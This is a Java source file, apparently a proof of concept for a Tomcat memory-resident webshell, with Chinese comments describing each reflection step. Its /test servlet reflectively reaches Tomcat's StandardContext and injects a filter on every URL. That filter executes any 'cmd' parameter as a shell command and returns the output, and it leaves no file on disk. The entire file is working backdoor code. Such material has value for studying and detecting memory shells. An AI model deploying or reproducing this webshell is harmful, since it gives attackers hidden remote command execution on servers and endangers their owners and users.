package com.example.filtershell;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;


@WebServlet("/test")
public class FilterEXP extends HttpServlet {
    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String FilterName = "cmd_Filter";
        ServletContext servletContext = request.getSession().getServletContext();
        try {
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);


            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig config) throws ServletException {
                }

                @Override
                public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
                    if (req.getParameter("cmd") != null) {
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        resp.getWriter().write(output);
                        resp.getWriter().flush();
                        return;
                    }
                    chain.doFilter(req, resp);
                }
                @Override
                public void destroy() {
                }
            };


            //反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加
            Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
            FilterDef o = (FilterDef) declaredConstructors.newInstance();
            o.setFilter(filter);
            o.setFilterName(FilterName);
            o.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(o);

            //反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去
            Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
            org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();
            o1.addURLPattern("/*");
            o1.setFilterName(FilterName);
            o1.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(o1);


            Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            //反射获取 ApplicationFilterConfig，构造方法将 FilterDef 传入后获取 filterConfig 后，将设置好的 filterConfig 添加进去
            Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
            Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
            declaredConstructor1.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);

            filterConfigs.put(FilterName,filterConfig);
            response.getWriter().write("Success");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}